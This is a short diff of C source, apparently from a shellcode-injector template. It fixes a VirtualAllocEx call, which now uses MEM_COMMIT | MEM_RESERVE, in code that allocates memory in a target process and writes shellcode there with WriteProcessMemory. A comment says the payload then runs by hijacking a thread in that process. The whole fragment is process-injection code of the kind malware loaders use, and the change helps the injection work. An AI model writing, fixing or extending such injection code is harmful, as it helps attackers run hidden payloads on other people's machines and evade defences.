@@ -78,7 +78,7 @@ int main(void)
     CloseHandle(Snap);
 
     // perform payload injection
-    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT, PAGE_EXECUTE_READ);
+    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
     WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
 
     // execute the payload by hijacking a thread in target process
